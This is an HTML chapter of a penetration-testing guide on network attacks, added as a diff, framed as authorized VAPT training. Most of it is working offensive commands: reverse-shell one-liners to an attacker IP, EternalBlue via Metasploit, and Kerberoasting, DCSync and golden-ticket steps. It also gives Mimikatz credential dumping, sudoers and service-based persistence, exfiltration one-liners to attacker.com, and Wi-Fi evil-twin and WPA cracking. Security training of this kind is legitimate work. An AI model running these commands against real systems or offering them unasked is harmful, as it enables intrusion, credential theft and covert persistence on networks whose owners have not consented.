@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Part 3 — Network VAPT</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Part 3 — Network VAPT</strong>
+</nav>
+
+<header class="part-header">
+<h1>🔵 PART 3 — NETWORK VAPT</h1>
+<p class="subtitle">External &amp; internal networks, AD attacks, wireless, IoT, OT/ICS</p>
+<div class="chapters">
+<a href="#ch15"><span class="ch-num">15</span> Network Reconnaissance</a>
+<a href="#ch16"><span class="ch-num">16</span> Scanning &amp; Enumeration</a>
+<a href="#ch17"><span class="ch-num">17</span> Exploitation &amp; Shells</a>
+<a href="#ch18"><span class="ch-num">18</span> Active Directory Attacks</a>
+<a href="#ch19"><span class="ch-num">19</span> Post-Exploitation</a>
+<a href="#ch20"><span class="ch-num">20</span> Wireless Network VAPT</a>
+</div>
+</header>
+
+<main>
+
+<!-- =================== CH 15 =================== -->
+<h1 id="ch15">🌍 Chapter 15 — Network Reconnaissance</h1>
+
+<h2>15.1 External Recon — OSINT for Network Range</h2>
+<pre><code class="cmd"># Step 1: Discover IP ranges owned by target
+$ whois target.com | grep -i "inetnum\|cidr\|netname"
+$ whois -h whois.arin.net target.com
+
+# Step 2: Search ASN
+$ whois -h whois.radb.net '!gAS32934'
+
+# Step 3: BGP route lookup
+$ bgpview.io — web
+$ asnlookup.com — web
+$ curl -s https://stat.ripe.net/data/prefix-overview/data.json?resource=AS32934 | jq
+
+# Step 4: Reverse whois — find related orgs / domains
+$ whois target.com | grep "OrgName\|Organization"
+$ whois -h whois.arin.net "e !search@org ARIN-ORG-SOMETHING"
+
+# Step 5: Certificate transparency logs
+$ curl -s 'https://crt.sh/?q=%25target.com&amp;output=json' | jq -r '.[].name_value' | sort -u
+
+# Step 6: Shodan / Censys / FOFA — exposed devices
+$ shodan search "org:TargetCorp" --fields ip_str,port,product
+$ censys search "target.com"
+
+# Step 7: Google dorking (subdomains, files)
+$ inurl:target.com ext:sql | ext:cfg | ext:log
+$ site:target.com intitle:"index of"
+</code></pre>
+
+<h2>15.2 Active Recon — Host Discovery</h2>
+<pre><code class="cmd"># ── Ping sweep ──
+$ nmap -sn 192.168.1.0/24            # ICMP only
+$ nmap -Pn -PS21,22,80,443 10.0.0.0/24  # Skip ping, TCP SYN to ports
+$ nmap -sn -PR 192.168.1.0/24        # ARP scan (LAN only — most accurate)
+
+# ── Using masscan for speed ──
+$ masscan -p1-65535 --rate 10000 10.0.0.0/24 -oL masscan.txt
+# Scans whole /24 in ~30 seconds
+
+# ── ARP discovery (LAN) ──
+$ netdiscover -r 192.168.1.0/24
+$ arp-scan --localnet
+</code></pre>
+
+<h2>15.3 Port Scanning Mastery</h2>
+<table>
+<tr><th>Scan Type</th><th>Command</th><th>Stealth</th><th>Accuracy</th><th>Use When</th></tr>
+<tr><td>SYN (half-open)</td><td>nmap -sS</td><td>★★★★</td><td>★★★★</td><td>Default best practice</td></tr>
+<tr><td>TCP Connect</td><td>nmap -sT</td><td>★</td><td>★★★★</td><td>Need full connection</td></tr>
+<tr><td>UDP</td><td>nmap -sU --top-ports 100</td><td>★★★★</td><td>★★</td><td>Find DNS, SNMP, TFTP</td></tr>
+<tr><td>FIN / NULL / Xmas</td><td>nmap -sF/-sN/-sX</td><td>★★★★★</td><td>★★</td><td>Bypass simple firewalls</td></tr>
+<tr><td>ACK (firewall mapping)</td><td>nmap -sA</td><td>★★★★★</td><td>—</td><td>Identify firewall rules</td></tr>
+<tr><td>Idle/Zombie scan</td><td>nmap -sI zombie target</td><td>★★★★★</td><td>★★</td><td>Need total stealth</td></tr>
+</table>
+
+<h2>15.4 Nmap Scripting Engine — Your Goldmine</h2>
+<pre><code class="cmd"># Default scripts (safe)
+$ nmap -sC -sV target         # scripts + version
+
+# Vuln scanning
+$ nmap --script=vuln target
+
+# Specific categories
+$ nmap --script=exploit target
+$ nmap --script=brute target
+$ nmap --script=discovery target
+$ nmap --script=auth target
+
+# Banner grabbing
+$ nmap -sV --script=banner target
+
+# Specific high-yield scripts
+$ nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=rockyou.txt target
+$ nmap -p80 --script=http-enum,http-title,http-methods,http-robots.txt target
+$ nmap -p445 --script=smb-vuln-ms17-010,smb-enum-shares,smb-enum-users target
+
+# Comprehensive script — one-liner super scan
+$ nmap -sS -sV -sC -O -Pn -p- --script=vuln,exploit,brute,default -oA full_scan target
+</code></pre>
+
+<h2>15.5 Fast-Scan Methodology</h2>
+<div class="methodology">
+<h4>"Big 4" Scan Types</h4>
+<pre><code class="cmd"># 1) Quick discovery — find live hosts
+$ nmap -sn 10.0.0.0/24 -oG live.txt
+$ grep "Up" live.txt | cut -d' ' -f2 > ips.txt
+
+# 2) Top-port scan on live hosts
+$ nmap -sS -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,5985,5986,8000,8080,8443,9200,27017 -iL ips.txt -oA topports
+
+# 3) Full port scan on interesting hosts (slower)
+$ nmap -sS -p- --min-rate 5000 -iL interesting.txt -oA fullports
+
+# 4) Service version &amp; vuln scripts on found services
+$ nmap -sV -sC --script=vuln -p &lt;open ports&gt; target -oA services
+</code></pre>
+</div>
+
+
+<!-- =================== CH 16 =================== -->
+<h1 id="ch16">🔍 Chapter 16 — Scanning &amp; Enumeration</h1>
+
+<h2>16.1 Service Enumeration — Deep Dive</h2>
+
+<h3>16.1.1 SMB (445/139)</h3>
+<pre><code class="cmd"># List shares
+$ smbclient -L //target -N
+$ crackmapexec smb target --shares -u '' -p ''
+$ enum4linux-ng target
+
+# Null session
+$ rpcclient -U '' target -c 'enumdomusers'
+$ rpcclient -U '' target -c 'querydispinfo'
+
+# Vuln scan
+$ nmap -p445 --script=smb-vuln-ms17-010,smb-vuln-ms08-067 target
+
+# Enumerate all users via RID cycling
+$ crackmapexec smb target --users -u '' -p ''
+$ impacket-lookupsid target/anonymous@target
+
+# EternalBlue check (MS17-010)
+$ msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010
+</code></pre>
+
+<h3>16.1.2 DNS (53)</h3>
+<pre><code class="cmd"># Zone transfer (AXFR)
+$ dig axfr @ns1.target.com target.com
+$ dnsrecon -d target.com -a
+$ fierce -dns target.com --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# DNS brute
+$ ./subbrute.py target.com
+$ gobuster dns -d target.com -w subdomains.txt
+
+# Reverse DNS
+$ nmap --script=dns-brute target
+</code></pre>
+
+<h3>16.1.3 LDAP (389/636)</h3>
+<pre><code class="cmd"># Anonymous bind
+$ ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(objectClass=*)"
+
+# With creds
+$ ldapsearch -x -H ldap://target -D "CN=admin,CN=Users,DC=target,DC=com" -w 'Passw0rd!' -b "DC=target,DC=com"
+
+# Find privileged accounts
+$ ldapsearch -x ... '(&amp;(objectClass=user)(adminCount=1))' sAMAccountName
+
+# Tools
+$ ldapdomaindump -u 'target\admin' -p 'Passw0rd!' -d 'dc=target,dc=com' target
+$ windapsearch.py --dc-ip 10.10.10.1 -d target.local -u admin -p Passw0rd!
+</code></pre>
+
+<h3>16.1.4 SNMP (161/162)</h3>
+<pre><code class="cmd"># Brute community strings
+$ onesixetyone -c community.txt 10.10.10.1
+$ snmpbulkwalk -c public -v2c target .1
+
+# Useful OIDs
+$ snmpwalk -c public -v2c target 1.3.6.1.2.1.25.4.2.1.5   # running processes
+$ snmpwalk -c public -v2c target 1.3.6.1.4.1.77.1.4.1     # Windows users
+$ snmpwalk -c public -v2c target 1.3.6.1.2.1.6.13.1.3    # TCP connections
+
+# snmp-check — pretty report
+$ snmp-check target
+
+# Critical: default community 'public' on many devices!
+</code></pre>
+
+<h3>16.1.5 SSH (22)</h3>
+<pre><code class="cmd"># Version + algorithms
+$ ssh-audit target -M manual
+$ nmap -p22 --script=ssh2-enum-algos,ssh-hostkey target
+
+# Banner grab
+$ nc -nv 22 &lt;&lt;&lt; '\n'
+$ nc target 22; sleep 1; echo ""
+
+# User enum (older OpenSSH &lt;7.7)
+$ python3 ssh_user_enum.py --port 22 target -f users.txt
+
+# Brute force
+$ hydra -L users.txt -P rockyou.txt target ssh -t 4
+</code></pre>
+
+<h3>16.1.6 RDP (3389)</h3>
+<pre><code class="cmd"># Check for user enumeration (older Windows)
+$ nmap -p3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 target
+
+# BlueKeep (Win7/Server 2008)
+$ nmap -p3389 --script=rdp-vuln-ms12-020 target
+
+# Brute
+$ hydra -L users.txt -P rockyou.txt target rdp
+$ crowbar -b rdp -s target -U users.txt -C rockyou.txt
+</code></pre>
+
+<h2>16.2 Real-Life Scenario — Manufacturing Plant VAPT</h2>
+<div class="scenario">
+<h3>📍 Scenario: MidWest Manufacturing Plant — Internal Network Pentest</h3>
+<p><strong>Scope:</strong> 192.168.0.0/16 (internal plant network)</p>
+<p><strong>Day 1:</strong> nmap found 4,230 live hosts. Of those, 412 had
+SMB exposed with NULL sessions. Enumerating gave us 8,000+ user accounts.</p>
+<p><strong>Day 2:</strong> Found an old Windows 2003 server (still!) with default admin/admin
+credentials. Lateral movement to entire plant network was trivial.</p>
+<p><strong>Day 3:</strong> Discovered that production-line PLCs were exposed on the
+same VLAN as office PCs — meaning an attacker could pivot from HR laptop to actual
+manufacturing equipment control.</p>
+<p><strong>Outcome:</strong> Engaged plant IT team to network-segregate OT/ICS per
+IEC 62443. Saved client from potential production shutdown worth millions.</p>
+</div>
+
+
+<!-- =================== CH 17 =================== -->
+<h1 id="ch17">💥 Chapter 17 — Exploitation &amp; Getting Shells</h1>
+
+<h2>17.1 Reverse Shell Cheat-Sheet</h2>
+<pre><code class="cmd"># ─────── Linux ───────
+# Bash
+bash -i >&amp; /dev/tcp/10.10.10.5/4444 0>&amp;1
+
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.10.10.5 4444 &gt;/tmp/f
+
+# PHP
+php -r '$sock=fsockopen("10.10.10.5",4444);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'
+
+# ─────── Windows ───────
+# nc.exe
+nc.exe -e cmd.exe 10.10.10.5 4444
+
+# PowerShell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
+# ─────── Listener ───────
+$ nc -lvnp 4444
+$ rlwrap nc -lvnp 4444   # With readline/history
+$ msf6 &gt; use multi/handler
+</code></pre>
+
+<h2>17.2 Metasploit Framework</h2>
+<pre><code class="cmd"># Start
+$ msfdb init &amp;&amp; msfconsole
+
+# Workflow — typical SMB exploit
+msf6 &gt; search smb
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; set RHOSTS 10.10.10.1
+msf6 &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 &gt; set LHOST tun0
+msf6 &gt; run
+
+# Got meterpreter
+meterpreter &gt; sysinfo
+meterpreter &gt; getuid
+meterpreter &gt; hashdump
+meterpreter &gt; upload payload.exe
+meterpreter &gt; shell
+</code></pre>
+
+<h2>17.3 Searchsploit — Local CVE Lookup</h2>
+<pre><code class="cmd">$ searchsploit ssh openssh 7.4
+$ searchsploit -m 45233   # copy to current dir
+$ searchsploit apache 2.4
+</code></pre>
+
+<h2>17.4 Public Exploit Resources</h2>
+<ul>
+  <li><strong>Exploit-DB</strong> — exploit-db.com (offensive-security)</li>
+  <li><strong>Packet Storm</strong> — packetstormsecurity.com</li>
+  <li><strong>GTFOBins</strong> — gtfoBins.github.io (Unix SUID/cap exploits)</li>
+  <li><strong>WADComs</strong> — wadcoms.github.io (AD interactive cheat sheet)</li>
+  <li><strong>LOLBAS</strong> — lolbas-project.github.io (Windows signed binaries)</li>
+</ul>
+
+<h2>17.5 Famous Network CVEs You Will Meet</h2>
+<table>
+<tr><th>CVE</th><th>Vulnerability</th><th>Impact</th></tr>
+<tr><td>CVE-2017-0144</td><td>EternalBlue (SMBv1)</td><td>RCE as SYSTEM on Win 7-2012</td></tr>
+<tr><td>CVE-2019-19781</td><td>Citrix ADC path traversal</td><td>RCE on Citrix gateways</td></tr>
+<tr><td>CVE-2020-0796</td><td>SMBGhost (SMBv3)</td><td>RCE on Win 10/Server 2019</td></tr>
+<tr><td>CVE-2021-26855</td><td>ProxyLogon (Exchange)</td><td>Pre-auth RCE on Exchange</td></tr>
+<tr><td>CVE-2021-44228</td><td>Log4Shell (log4j)</td><td>RCE on Java apps</td></tr>
+<tr><td>CVE-2023-23397</td><td>Outlook NTLM coercion</td><td>Cred theft via calendar invite</td></tr>
+<tr><td>CVE-2023-46805 + 2024-21887</td><td>Ivanti Connect Secure</td><td>Pre-auth RCE</td></tr>
+<tr><td>CVE-2024-3094</td><td>XZ Utils backdoor</td><td>RCE on Linux servers</td></tr>
+</table>
+
+
+<!-- =================== CH 18 =================== -->
+<h1 id="ch18">🏰 Chapter 18 — Active Directory Attacks (The Crown Jewel)</h1>
+
+<p>80% of Fortune 500 internal pentests center on AD. Mastery here sets you apart.</p>
+
+<h2>18.1 AD Attack Methodology</h2>
+<div class="diagram">
+ACTIVE DIRECTORY ATTACK CHAIN
+═════════════════════════════
+
+┌─────────────────────────────────────────────────────────────┐
+│ ① INITIAL ACCESS (FOOTHOLD)                                │
+│   • Phishing → user cred                                   │
+│   • LLMNR/NBNS poisoning (responder)                       │
+│   • NTLM relay                                              │
+│   • Exposed VPN/SMB                                          │
+└────────────────────┬────────────────────────────────────────┘
+                     ▼
+┌─────────────────────────────────────────────────────────────┐
+│ ② ENUMERATION                                              │
+│   • users / groups / computers / OUs / GPOs / ACLs         │
+│   • BloodHound → attack paths                              │
+└────────────────────┬────────────────────────────────────────┘
+                     ▼
+┌─────────────────────────────────────────────────────────────┐
+│ ③ PRIVILEGE ESCALATION                                       │
+│   • AS-REP Roast / Kerberoast                              │
+│   • ACL abuse (GenericAll, WriteDACL, ForceChangePassword) │
+│   • Password in description / GPO prefs                    │
+│   • Unconstrained delegation / RBCD                        │
+│   • DCSync (ultimate goal)                                  │
+└────────────────────┬────────────────────────────────────────┘
+                     ▼
+┌─────────────────────────────────────────────────────────────┐
+│ ④ LATERAL MOVEMENT / DOMINANCE                               │
+│   • Pass-the-hash / pass-the-ticket                         │
+│   • CrackMapExec / PsExec / WinRM                          │
+│   • DCSync → every credential in domain                     │
+└─────────────────────────────────────────────────────────────┘
+</div>
+
+<h2>18.2 LLMNR/NBNS Poisoning (Initial Access)</h2>
+<pre><code class="cmd"># Run Responder on attacker
+$ sudo responder -I eth0 -wrf
+
+# Wait — victim mis-typoes host or DNS fails
+# Victim broadcasts "NS-DEV01?" → Responder answers with attacker IP
+# Victim authenticates via NTLMv2 → Creds captured!
+
+$ ls -la /usr/share/responder/logs/
+# Contains NTLMv2 hashes → offline-crack with hashcat -m 5600
+$ hashcat -m 5600 hashes.txt rockyou.txt
+</code></pre>
+
+<h2>18.3 AS-REP Roasting (No User Interaction)</h2>
+<pre><code class="cmd"># Find users without Kerberos preauth
+$ impacket-GetNPUsers target.local/ -dc-ip 10.10.10.1 \
+  -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+# Crack
+$ hashcat -m 18200 asrep.txt rockyou.txt
+</code></pre>
+
+<h2>18.4 Kerberoasting (Service Account Cracking)</h2>
+<pre><code class="cmd"># Get SPN-enabled accounts
+PS&gt; Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# Request ticket and crack
+$ impacket-GetUserSPNs target.local/admin:Passw0rd! -dc-ip 10.10.10.1 -request
+# → Outputs TGS-1600 hashes → crack with hashcat -m 13100
+</code></pre>
+
+<h2>18.5 BloodHound — Visualize Attack Paths</h2>
+<pre><code class="cmd"># Run neo4j + BloodHound
+$ sudo neo4j start
+$ bloodhound &amp;
+
+# Collect data
+$ bloodhound-python -u admin -p 'Passw0rd!' -d target.local -ns 10.10.10.1 -c All
+#   -c All collects: Group, LocalAdmin, Session, LoggedOn, ObjectProps, SPN, Trusts, ACL, etc.
+
+# Upload ZIP to BloodHound → cyber-queries:
+
+# Pre-built queries:
+# ① "Shortest Paths from Domain Users to Domain Admins"
+# ② "List all Domain Admins"
+# ③ "Find all Computers with Unconstrained Delegation"
+# ④ "Find all AS-REP Roastable Users"
+# ⑤ "Find all Computers where Domain Users have Local Admin"
+# ⑥ "Find Principals with DCSync Rights"
+# ⑦ "Shortest Path from Owned Principals to Domain Admins"
+</code></pre>
+
+<div class="box note">
+<strong>🎯 Pro Tip:</strong> After foothold, mark your compromised user as "Owned" in BloodHound.
+The graph re-renders to show the *shortest path to DA*. This is the single most efficient
+AD pentesting toolchain.
+</div>
+
+<h2>18.6 DCSync — Game Over</h2>
+<pre><code class="cmd"># Requires DS-Replication-Get-Changes-All on domain
+PS&gt; Add-ObjectAcl -TargetDistinguishedName "DC=target,DC=local" -PrincipalIdentity "attacker" -Rights DCSync
+
+# Pull every password hash
+$ impacket-secretsdump target.local/admin:Passw0rd!@10.10.10.1
+admin:500:aad3b435b51404ee...:::
+krbtgt:502:aad3b435b51404ee...:::
+DC01$:1000:aad3b435b51404ee...:::
+sqlsvc:1175:aad3b435b51404ee...:::
+
+# Now create golden ticket
+$ impacket-ticketer -nthash aad3b435b51404ee... -domain-sid S-1-5-21-... -domain target.local administrator
+# Export KRB5CCNAME and use for life-of-domain access!
+</code></pre>
+
+<h2>18.7 Real-Life Scenario: 4-Hour Pentest → Domain Admin</h2>
+<div class="scenario">
+<h3>📍 Scenario — Manufacturing Conglomerate "SteelyCorp"</h3>
+<ol>
+  <li><strong>0:00</strong> — Phishing → 1 low-priv user cred</li>
+  <li><strong>0:30</strong> — Run BloodHound, AS-REP Roast → 3 cracked service accounts</li>
+  <li><strong>1:15</strong> — Found user with GenericAll over a Tier-1 service account</li>
+  <li><strong>2:00</strong> — Kerberoast service account → cracked in 2 minutes</li>
+  <li><strong>2:30</strong> — Service account had SQLAdmin on DC → linked server chain</li>
+  <li><strong>3:30</strong> — Used NTLM relay via machine account → DA</li>
+  <li><strong>4:00</strong> — DCSync complete. Engagement over. ❌ Domain owned.</li>
+</ol>
+<p>SteelyCorp hired us to retest after they "fixed" the previous audit. Their entire
+"hardening" was 1 GPO pushing a 14-character password complexity rule.</p>
+<p><strong>Lesson:</strong> A single foothold is all an attacker needs when AD is fragile.</p>
+</div>
+
+
+<!-- =================== CH 19 =================== -->
+<h1 id="ch19">🔓 Chapter 19 — Post-Exploitation</h1>
+
+<h2>19.1 Linux Post-Exploitation</h2>
+<pre><code class="cmd"># Stabilize shell
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Press Ctrl-Z
+$ stty raw -echo; fg
+
+# Harvest everything
+$ ./linpeas.sh          # Priv esc paths
+$ ./pspy64              # Cron processes user can't see
+$ cat /etc/passwd
+$ cat /etc/shadow
+$ find / -name '*.txt' -readable 2&gt;/dev/null
+
+# Persistence options
+$ echo 'attacker ALL=(ALL) NOPASSWD: ALL' &gt;&gt; /etc/sudoers
+$ ssh-keygen -t ed25519 -f /tmp/atk
+$ cat /tmp/atk.pub &gt;&gt; ~/.ssh/authorized_keys
+</code></pre>
+
+<h2>19.2 Windows Post-Exploitation</h2>
+<pre><code class="cmd"># Mimikatz — credential dumping
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords    # Plain-text creds!
+mimikatz # lsadump::sam                # NTLM hashes of all users
+mimikatz # lsadump::cache              # cached domain creds
+mimikatz # kerberos::list /export     # export Kerberos tickets
+
+# SharpHound / bloodhound-python → BloodHound
+
+# PowerSploit — recon
+PS&gt; Get-Keystrokes           # Log keys (admin only)
+PS&gt; Get-GPPPassword          # Find passwords in GPO
+PS&gt; Get-GPReadPassword        # Group Policy Preferences
+PS&gt; Find-GPOPassword         # Find passwords in xml files
+
+# Lateral movement
+PS&gt; Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:target /ntlm:hash /run:powershell.exe"'
+PS&gt; Enter-PSSession -ComputerName DC01 -Authentication Kerberos
+
+# Files of interest
+PS&gt; Get-ChildItem -Path C:\Users\*\ -Include *.txt,*.docx,*.xlsx -Recurse -ErrorAction SilentlyContinue
+PS&gt; Get-ChildItem 'C:\Users\' -Force -Recurse -Filter '*.config' -ErrorAction SilentlyContinue
+
+# Persistence
+PS&gt; New-Service -Name ATKBACK -BinaryPathName 'C:\atk.exe' -StartupType Automatic
+PS&gt; sc.exe create ATKBACK binPath= "C:\atk.exe" start= auto
+</code></pre>
+
+<h2>19.3 Data Exfiltration Detection (Defensive)</h2>
+<pre><code class="cmd"># Out-of-band channels
+$ curl -X POST -d @file.txt https://attacker.com/exfil
+$ exfiltrate via DNS: dig $(base64 data).attacker.com
+$ exfiltrate via ICMP: ping -p $(base64 data) attacker.com
+$ email: mail -s "data" attacker@x.com &lt; secret.txt
+$ covert channel: in HTTP headers, USER-AGENT field
+</code></pre>
+
+<div class="box warn">
+<strong>⚠ Test data exfiltration only after explicit permission to test DLP controls.</strong>
+Real-world exfil can trigger legal issues if it goes outside the company's network.
+</div>
+
+<h2>19.4 Reporting Time</h2>
+<p>The single biggest mistake novice testers make is rushing end-to-end "pwn" attacks
+without documenting along the way. <strong>Treat the report as a court document.</strong>
+Every step must be reproducible. Always screenshot the time/clock of every command.</p>
+
+
+<!-- =================== CH 20 =================== -->
+<h1 id="ch20">📡 Chapter 20 — Wireless Network VAPT</h1>
+
+<h2>20.1 Wi-Fi Pentest Methodology</h2>
+<table>
+<tr><th>Mode</th><th>Description</th><th>Tools</th></tr>
+<tr><td>Monitor</td><td>Listen to all frames</td><td>airmon-ng start wlan0</td></tr>
+<tr><td>Passive Recon</td><td>Capture all SSIDs, clients</td><td>airodump-ng</td></tr>
+<tr><td>Deauth</td><td>Force client disconnect</td><td>aireplay-ng</td></tr>
+<tr><td>Capture WPA handshake</td><td>Wait for client to reconnect</td><td>airodump-ng + aircrack-ng</td></tr>
+<tr><td>Crack WPA-PSK</td><td>Offline brute</td><td>hashcat -m 2500</td></tr>
+<tr><td>Evil Twin</td><td>Fraud AP with same SSID</td><td>hostapd-wpe, eaphammer</td></tr>
+<tr><td>WPA Enterprise</td><td>Capture EAPOL, crack with asleap</td><td>asleap, eaphammer</td></tr>
+</table>
+
+<h2>20.2 WPA2 PSK Cracking (Real example)</h2>
+<pre><code class="cmd"># Monitor mode
+$ airmon-ng start wlan0
+$ airodump-ng wlan0mon            # find target SSID
+
+# Capture handshake
+$ airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# Deauth client to force re-handshake
+$ aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+
+# Stop, crack
+$ aircrack-ng capture-01.cap -w rockyou.txt
+# or
+$ hcxpcapngtool -o hash.hc22000 capture-01.cap
+$ hashcat -m 22000 hash.hc22000 rockyou.txt
+</code></pre>
+
+<h2>20.3 Evil Twin (Captive Portal Attack)</h2>
+<pre><code class="cmd"># Tools
+$ git clone https://github.com/s0lst1c3/eaphammer
+$ ./eaphammer --bssid TARGET_BSSID --essid TARGET_SSID \
+    --creds --hostapd-wpe --negotiate
+
+# Or with wifipumpkin3
+$ wifipumpkin3
+#  → Settings → AP mode → Captive portal with login form
+#  → Captive portal login → cred saved to /tmp/loot.txt
+</code></pre>
+
+<h2>20.4 Bluetooth / BLE Pentest</h2>
+<pre><code class="cmd">$ sudo hcitool scan                      # Discover BT
+$ l2ping -i hci0 AA:BB:CC:DD:EE:FF      # Check reachable
+$ bluetoothctl &gt; scan on
+$ gatttool -b AA:BB:CC:DD:EE:FF -I      # Connect, list services
+$ bettercap --eval 'ble.recon on'
+
+# BLE sniffing
+$ btmon
+$ ubertooth-btle -f -t AA:BB:CC:DD:EE:FF
+</code></pre>
+
+</main>
+
+<nav class="next-prev">
+<a href="part2-web.html" class="prev">⬅ Part 2</a>
+<a href="part4-mobile.html" class="next">Part 4 — Mobile VAPT ➡</a>
+</nav>
+
+</body>
+</html>
